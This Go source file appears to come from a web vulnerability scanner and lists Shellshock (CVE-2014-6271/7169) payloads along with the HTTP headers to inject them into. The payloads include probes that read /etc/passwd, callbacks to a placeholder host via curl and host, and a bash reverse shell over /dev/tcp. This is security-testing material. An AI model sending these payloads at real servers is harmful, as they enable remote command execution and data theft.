package cmdi

// Shellshock (CVE-2014-6271 / CVE-2014-7169) payloads.
//
// Bash parses an exported environment variable that starts with `() {`
// as a function definition. Anything after `}` is then executed in the
// importing shell — and CGI/SSI handlers pass HTTP headers
// (User-Agent, Referer, Cookie, X-Forwarded-For) into the environment.
//
// Mirrors AWVS Bash_RCE.script / Bash_RCE_Server_Audit.script. The
// scanner injects these into request headers when targeting suspected
// CGI / mod_cgi / Perl/Bash CGI endpoints.
//
// Source: original NCC Group + Akamai CVE-2014-6271 write-ups.

var shellshockPayloads = []Payload{
	// Canonical CVE-2014-6271 — empty function then `;` + arbitrary cmd.
	{Value: "() { :;}; echo ASSAY_SHELLSHOCK", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock CVE-2014-6271 reflective echo probe"},
	// Time-based confirmation.
	{Value: "() { :;}; /bin/sleep 5", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Shellshock time-based sleep"},
	// Command-substitution variant — survives some filters that strip `;`.
	{Value: "() { :;}; $(echo ASSAY_SHELLSHOCK)", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock $(...) substitution variant"},
	// CVE-2014-7169 — parser bug that triggers even after Patch #1.
	{Value: "() { (a)=>\\ ; echo ASSAY_SHELLSHOCK", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock CVE-2014-7169 partial-patch bypass"},
	// OOB DNS probe — bash → host → DNS resolution against attacker.
	{Value: "() { :;}; /bin/bash -c \"/usr/bin/host {OAST_HOST}\"", Platform: PlatformLinux, Type: TypeBlind, Description: "Shellshock OOB DNS exfil (host)"},
	// OOB HTTP probe — curl callback when /usr/bin/curl exists.
	{Value: "() { :;}; /usr/bin/curl http://{OAST_HOST}/shellshock", Platform: PlatformLinux, Type: TypeBlind, Description: "Shellshock OOB curl callback"},
	// /etc/passwd direct read — CGI handlers often run as a low-priv user
	// with read access; useful as a confirm-impact leg.
	{Value: "() { :;}; /bin/cat /etc/passwd", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock /etc/passwd read"},
	// Reverse shell — full exploitation marker (gated on engagement scope).
	{Value: "() { :;}; /bin/bash -i >& /dev/tcp/{OAST_HOST}/4444 0>&1", Platform: PlatformLinux, Type: TypeDirect, Description: "Shellshock reverse shell"},
}

// GetShellshockPayloads returns the Shellshock (CVE-2014-6271 family)
// payload set. These are intended to be injected into request headers
// (User-Agent, Referer, Cookie, X-Forwarded-For) when the scanner has
// identified a CGI-style endpoint, not into URL parameters or body fields.
func GetShellshockPayloads() []Payload {
	return shellshockPayloads
}

// ShellshockHeaders returns the request-header names that classic CGI/SSI
// pipelines copy verbatim into bash environment variables, making them
// viable Shellshock injection points.
func ShellshockHeaders() []string {
	return []string{
		"User-Agent",
		"Referer",
		"Cookie",
		"X-Forwarded-For",
		"X-Forwarded-Host",
		"X-Real-IP",
		"Accept",
		"Accept-Language",
		"Accept-Encoding",
	}
}
